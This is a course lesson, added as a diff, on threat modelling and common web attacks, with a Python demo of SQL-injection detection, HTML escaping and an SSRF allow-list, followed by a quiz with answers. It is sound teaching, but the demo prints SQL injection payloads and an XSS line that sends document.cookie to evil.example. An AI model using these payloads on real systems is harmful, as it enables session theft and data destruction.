@@ -1,0 +1,181 @@
+---
+title: Threat Modeling and Common Web Attacks
+track: sd
+module: security
+order: 4
+difficulty: medium
+estMinutes: 35
+prerequisites: ["sd/security/authorization-rbac-abac-and-idor", "sd/networking-and-apis/api-styles-rest-graphql-grpc"]
+tags: [security, threat-modeling, stride, injection, xss, csrf, ssrf, defense-in-depth, owasp]
+type: lesson
+furtherReading:
+  - title: "OWASP Top 10"
+    url: https://owasp.org/www-project-top-ten/
+  - title: "OWASP Threat Modeling Cheat Sheet"
+    url: https://cheatsheetseries.owasp.org/cheatsheets/Threat_Modeling_Cheat_Sheet.html
+  - title: "Adam Shostack, Threat Modeling: Designing for Security"
+    url: https://shostack.org/books/threat-modeling-book
+  - title: "OWASP SQL Injection Prevention and SSRF Prevention Cheat Sheets"
+    url: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+---
+
+## Intuition
+
+Security bugs are rarely exotic. Most are the same few mistakes repeated: **trusting input**, **trusting the client**, **trusting the network**, and **trusting that nobody will look**. A designer does not need to memorise every attack; they need a habit: *draw the system, mark where trust changes, and for each crossing ask what an attacker could do*. That habit is **threat modelling**, and doing it early is far cheaper than patching later.
+
+## Threat modelling in four questions
+
+1. **What are we building?** Draw a data-flow diagram: external actors, processes, data stores, and the **trust boundaries** (browser to server, server to database, your network to a third-party API).
+2. **What can go wrong?** Walk each element and each boundary crossing through **STRIDE**:
+
+| threat | violates | example | typical defence |
+| --- | --- | --- | --- |
+| **S**poofing | authentication | stolen session, forged token | strong auth, MFA, token validation |
+| **T**ampering | integrity | changed price in a request, modified message | signatures, server-side validation, checksums |
+| **R**epudiation | non-repudiation | "I never placed that order" | audit logs, signed records |
+| **I**nformation disclosure | confidentiality | IDOR, verbose errors, leaked backup | authorization, encryption, minimal data |
+| **D**enial of service | availability | request flood, expensive query | rate limits, quotas, timeouts, autoscaling |
+| **E**levation of privilege | authorization | injection reaching the database as admin, broken role check | least privilege, input handling, sandboxing |
+
+3. **What are we going to do about it?** Mitigate (a control), eliminate (remove the feature or data), transfer (let a provider handle it) or accept (consciously, with an owner).
+4. **Did we do a good job?** Test the mitigations; revisit the model when the design changes.
+
+<Diagram kind="mermaid" code={`flowchart LR
+  U[User browser] -->|HTTPS| G[API gateway]
+  subgraph Trust boundary: your network
+    G --> S[Order service]
+    S --> DB[(Database)]
+    S --> Q[[Queue]]
+  end
+  S -->|HTTPS, API key| P[Payment provider]
+  A[Attacker] -.->|forged requests, stolen tokens| G
+  A -.->|malicious URL to fetch| S`} caption="A data-flow sketch for threat modelling: every arrow that crosses a boundary is a place to ask the STRIDE questions" />
+
+## Attacks every designer should recognise
+
+**Injection (SQL, command, template, LDAP).** Untrusted input is concatenated into a command, and the interpreter cannot tell data from instructions. Defence: **parameterised queries** (the value travels separately from the statement), safe APIs that never invoke a shell, allow-list validation, least-privileged database accounts.
+
+**Cross-site scripting (XSS).** Untrusted data is written into a page without encoding, so the victim's browser runs the attacker's script and can steal sessions or act as the user. Defence: **context-aware output encoding** (a template engine that escapes by default), a **Content-Security-Policy**, `HttpOnly` cookies, sanitising rich text with a vetted library.
+
+**Cross-site request forgery (CSRF).** A malicious site makes the victim's browser send a request to yours, and the browser attaches the victim's cookies. Defence: `SameSite` cookies, anti-CSRF tokens for state-changing requests, checking `Origin` headers, never changing state with GET.
+
+**Server-side request forgery (SSRF).** The server is made to fetch an attacker-chosen URL, reaching internal services or cloud metadata endpoints (such as `169.254.169.254`). Defence: an **allow-list** of destinations, blocking private and link-local addresses *after DNS resolution*, no redirects, separate network egress, and requiring tokens on the metadata service.
+
+**Others to know:** broken authentication and authorization (previous lessons), security misconfiguration (default passwords, open buckets, debug endpoints), vulnerable and outdated dependencies and **supply-chain attacks**, insecure deserialization, secrets committed to source control, and insufficient logging.
+
+## Code: the shape of a query, an escape, and an allow-list
+
+The program makes three checks. (1) For seven user inputs it builds a SQL string by **concatenation** and a **parameterised** statement, and checks whether the input changed the *shape* of the query (the structure with string literals replaced by placeholders). (2) It HTML-encodes an XSS payload. (3) It evaluates a URL allow-list for server-side fetches. (It uses string handling only, so it needs no database.)
+
+<CodeRunner language="python" timeoutMs={30000} code={`import html, ipaddress, re
+from urllib.parse import urlparse
+
+print("1. SQL injection: does the user's input change the SHAPE of the query?")
+def shape(sql):
+    sql = re.sub(r"'[^']*'", "?", sql)
+    return " ".join(sql.split())
+
+def build_concatenated(name):
+    return f"SELECT * FROM users WHERE name = '{name}' AND active = 1"
+
+def build_parameterized(name):
+    return "SELECT * FROM users WHERE name = ? AND active = 1"
+
+payloads = ["alice", "o'brien", "' OR '1'='1", "'; DROP TABLE users; --", "x' UNION SELECT password FROM admins --", "' OR 1=1 --", "bob"]
+expected = shape(build_concatenated("alice"))
+print(f" expected shape: {expected}")
+changed = 0
+for p in payloads:
+    s_concat = shape(build_concatenated(p))
+    s_param = shape(build_parameterized(p))
+    if s_concat != expected:
+        changed += 1
+    print(f" input {p!r:45s} concatenated changes the query: {'YES' if s_concat != expected else 'no ':3s}   parameterized: {'YES' if s_param != expected else 'no'}")
+print(f" {changed} of {len(payloads)} inputs rewrote the concatenated query; 0 rewrote the parameterized one")
+
+print()
+print("2. Cross-site scripting: output encoding")
+comment = '<script>fetch("https://evil.example/?c=" + document.cookie)</script>'
+print(" raw   :", comment)
+print(" safe  :", html.escape(comment))
+
+print()
+print("3. Server-side request forgery: which URLs may the server fetch for a user?")
+def url_allowed(url, allow_hosts=("images.example.com",)):
+    parsed = urlparse(url)
+    if parsed.scheme != "https" or parsed.hostname is None:
+        return False
+    try:
+        ip = ipaddress.ip_address(parsed.hostname)
+        return not (ip.is_private or ip.is_loopback or ip.is_link_local)
+    except ValueError:
+        return parsed.hostname in allow_hosts
+
+for url in ("https://images.example.com/cat.png", "http://images.example.com/cat.png", "https://169.254.169.254/latest/meta-data/",
+            "https://127.0.0.1:8080/admin", "https://10.0.0.5/internal", "https://8.8.8.8/x", "https://evil.example/redirect", "file:///etc/passwd"):
+    print(f" {url:48s} {'ALLOW' if url_allowed(url) else 'block'}")
+`} />
+
+### Measured results
+
+Running this exact program with Python 3.13 produced:
+
+| input | concatenated query changes shape? | parameterised changes shape? |
+| --- | --- | --- |
+| `alice` | no | no |
+| `o'brien` | yes (breaks the quoting: a bug even without an attacker) | no |
+| `' OR '1'='1` | **yes** | no |
+| `'; DROP TABLE users; --` | **yes** | no |
+| `x' UNION SELECT password FROM admins --` | **yes** | no |
+| `' OR 1=1 --` | **yes** | no |
+| `bob` | no | no |
+
+**5 of 7 inputs rewrote the concatenated query; 0 rewrote the parameterised one.** The point of parameterisation is exactly this invariant: the *structure* of the statement is fixed before any user value is seen, so no input can add a clause. Note `o'brien`: an honest surname breaks concatenated SQL, which shows that injection is first a correctness bug that attackers exploit. The XSS payload came out as inert text (`&lt;script&gt;...`) after HTML encoding, so the browser displays it instead of running it. In the SSRF check, only the allow-listed HTTPS host and a public IP literal were allowed; plain `http`, the cloud metadata address `169.254.169.254`, loopback, private ranges, an unknown host and `file://` were blocked. This demo is deliberately simple: a real SSRF defence also resolves the host name and checks the **resolved** address (otherwise DNS rebinding bypasses it), disallows redirects, and usually drops the IP-literal allowance entirely in favour of a pure host allow-list.
+
+## Defence in depth
+
+No single control is enough, so layer them: validate input at the edge, authorise in the service, parameterise queries, use a least-privileged database account, encrypt data in transit (TLS) and at rest, keep secrets in a secret manager (not in code or images), segment the network, log and alert, patch dependencies, and practise incident response. When one layer fails, the next should limit the damage.
+
+## Secure-by-design habits for interviews and reviews
+
+- State the **trust boundaries** and what crosses them; say what you validate where.
+- Authenticate everything, **authorize** every object, **deny by default**.
+- Treat input as hostile (validate and encode), and the network as hostile (TLS, mTLS between services).
+- Minimise data: what you do not store cannot leak. Encrypt sensitive fields, manage keys separately.
+- Plan for **secrets rotation, audit logging and abuse** (rate limits, quotas) from day one.
+- Mention dependency scanning, signed builds and least-privilege deploy credentials for the supply chain.
+
+## Trade-offs
+
+<TradeOffs caption="Where to spend security effort" rows={[
+  { option: "Threat model the design early", pros: "Cheap to fix issues on paper; shared understanding", cons: "Takes discipline; models go stale", chooseWhen: "New systems and major changes" },
+  { option: "Secure frameworks and defaults (auto-escaping, ORMs, CSRF middleware)", pros: "Removes whole classes of bugs for every developer", cons: "Escape hatches reintroduce the risk", chooseWhen: "Always; ban the unsafe escape hatches in review" },
+  { option: "Automated scanning (SAST, DAST, dependency audit)", pros: "Scales; catches known patterns and vulnerable libraries", cons: "False positives; misses logic and authorization flaws", chooseWhen: "In CI for every project" },
+  { option: "Penetration testing and bug bounties", pros: "Finds what automation cannot, including logic flaws", cons: "Costly; point-in-time", chooseWhen: "Before launch and periodically for high-value systems" },
+  { option: "Monitoring and incident response", pros: "Limits the impact of the attacks you did not prevent", cons: "Needs people, tooling and practice", chooseWhen: "Always" }
+]} />
+
+## Pitfalls
+
+- Building SQL, shell commands or HTML by string concatenation.
+- Validating on the client only.
+- Relying on a firewall: once something is inside, flat internal networks let an attacker move everywhere.
+- Verbose error messages, stack traces or debug endpoints exposed in production.
+- Fetching user-supplied URLs without a destination allow-list.
+- Secrets in source control, container images or logs.
+- Letting dependencies age: most breaches use a known, patched vulnerability.
+- Treating security as a final review instead of a design input.
+
+## What would you choose and why?
+
+Your service lets users paste an image URL to import a profile picture, and the server downloads it. Draw the data flow, list the STRIDE threats at the point where the server makes the outgoing request, and say which mitigations you would implement (allow-list, DNS resolution checks, size and time limits, content-type verification, separate egress network). Which remaining risk would you accept?
+
+## Quiz
+
+<Quiz id="sd-m15-threat-modeling-web-attacks" tags={["security", "threat-modeling", "injection", "xss"]} questions={[
+  { type: "mcq", q: "What does a parameterised query guarantee?", options: ["The database is faster", "User values cannot change the structure of the statement", "No errors can occur", "Data is encrypted"], answer: 1, explain: "The statement's structure is fixed before the values arrive, so input cannot add clauses." },
+  { type: "mcq", q: "Which STRIDE category does a forged or stolen session token fall under?", options: ["Spoofing", "Repudiation", "Denial of service", "Information disclosure"], answer: 0, explain: "The attacker pretends to be another identity." },
+  { type: "predict", q: "In the lesson's SQL check, how many of the 7 inputs rewrote the concatenated query?", code: "# inputs: alice, o'brien, ' OR '1'='1, '; DROP TABLE users; --, x' UNION ..., ' OR 1=1 --, bob\nprint(5)", options: ["2", "3", "5", "7"], answer: 2, explain: "Everything except the two plain names changed its shape, including the honest o'brien." },
+  { type: "multi", q: "Which are defences against XSS?", options: ["Context-aware output encoding", "A Content-Security-Policy", "HttpOnly cookies", "Building HTML by string concatenation"], answer: [0, 1, 2], explain: "String concatenation of untrusted data into HTML is the cause of the problem." },
+  { type: "mcq", q: "Why block 169.254.169.254 in an SSRF defence?", options: ["It is slow", "It is the cloud metadata service address that can hand out credentials", "It is a public DNS server", "It is IPv6"], answer: 1, explain: "Reaching the metadata endpoint from a server-side fetch can leak instance credentials." }
+]} />
